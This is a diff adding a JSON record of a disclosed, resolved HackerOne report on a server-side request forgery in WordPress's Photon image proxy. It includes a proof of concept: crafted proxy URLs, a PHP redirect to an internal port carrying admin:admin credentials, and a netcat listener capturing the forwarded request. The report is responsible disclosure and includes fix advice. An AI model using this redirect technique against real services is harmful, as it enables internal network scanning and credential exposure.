@@ -1,0 +1,120 @@
+{
+  "id": 204513,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDQ1MTM=",
+  "url": "https://hackerone.com/reports/204513",
+  "title": "Infrastructure - Photon - SSRF",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2017-02-08T10:06:44.378Z",
+  "submitted_at": "2017-02-08T10:06:44.378Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "skansing",
+    "url": "/skansing",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 55,
+    "url": "https://hackerone.com/wordpress",
+    "handle": "wordpress",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "WordPress",
+      "twitter_handle": "wordpress",
+      "website": "https://wordpress.org/",
+      "about": "Beautiful sites of any kind."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-07-17T23:50:14.884Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-06-17T23:50:07.613Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Description\n------------------------\nThe service Photon located at `http://i0.wp.com/` and described at `https://code.trac.wordpress.org/browser/photon/` is vulnerable to Http SSRF via. redirect.\n\nThe redirect can go to any IP (including inside of any firewall photon might be inside) any port and can add auth headers.\n\nThe service does try to protect itself against this type of attack by using\n```\n// https://code.trac.wordpress.org/browser/photon/index.php#L111\ncurl_setopt( $ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS );\n```\nBut this does not guard against internal IP's, auth redirects nor other port attacks via http/https.\n\nDue to the different responses an attacker can use the service to scan and attack IP ranges for http services, do malicious actions and etc. \n\nPOC\n-----------------------------------\n**First a demo that the service does not allow firing requests to any port.**\n\n*Note you can bust the cache by changing the params given to Photon, so if no response is given, just bump n+1 on resize param or add a new param*\n\n- Goto `http://i0.wp.com/159.203.190.123:666/new.php?resize=0,1`\n- The responds `Sorry, the parameters you provided were not valid`\n\nThis protection happens because of the filter validation\n\n```\n// https://code.trac.wordpress.org/browser/photon/index.php#L142\nif ( isset( $_GET['q'] ) ) {\n        if ( $origin_domain_exception & PHOTON__ALLOW_QUERY_STRINGS ) {\n                $url .= '?' . preg_replace( '/#.*$/', '', (string) $_GET['q'] );\n                unset( $_GET['q'] );\n        } else {\n                httpdie( '400 Bad Request', 'Sorry, the parameters you provided were not valid' );\n        }\n}\n\t\nif ( false === filter_var( $url, FILTER_VALIDATE_URL, FILTER_FLAG_PATH_REQUIRED ) )\n        httpdie( '400 Bad Request', 'Sorry, the parameters you provided were not valid' );\n```\n\n\n**Now a demo of bypassing the port restriction and appending authorization headers.**\n- Goto `http://i0.wp.com/159.203.190.123/new.php?resize=0,2`\n- The server gets a incoming request and responds with a 302\n`192.0.102.120 - - [08/Feb/2017:04:15:44 -0500] \"GET /new.php HTTP/1.1\" 302 199 \"-\" \"Photon/1.0\"`\n- Photon blindly follow the redirect, here is the output of a netcat listening in with the following command. `nc -l -p 666` and the Photon coming in\n\n```\nGET / HTTP/1.1\nHost: 159.203.190.123:666\nAuthorization: Basic YWRtaW46YWRtaW4=\nUser-Agent: Photon/1.0\nAccept: */*\n```\nThe contents of `new.php` \n```\n<?php\nheader('Location: http://admin:admin@159.203.190.123:666');\n```\n\n\nPossible Fixes\n-----------------------\nThe side effects of the SSRF is => redirect to any IP, to any port, auth headers.\n\nI have seached for a way to configure these things in cURL but without success.\nI would recommend doing 1 request at a time, manually parsing the response and initiating a new request if the validates for such criteria.\n\nAlso consider using `curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, TRUE );` atm. the link is vuln to MITM attack as the certs are not verified.  \n\n ",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2017-07-17T23:50:07.695Z",
+  "allow_singular_disclosure_after": -277414440.2492257,
+  "singular_disclosure_allowed": true,
+  "vote_count": 21,
+  "voters": [
+    "bogdantc",
+    "bl4de",
+    "skansing",
+    "ak1",
+    "madrobot",
+    "r3y",
+    "eveeez",
+    "sa1tama0",
+    "vulnh0lic",
+    "linkks",
+    "and 11 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
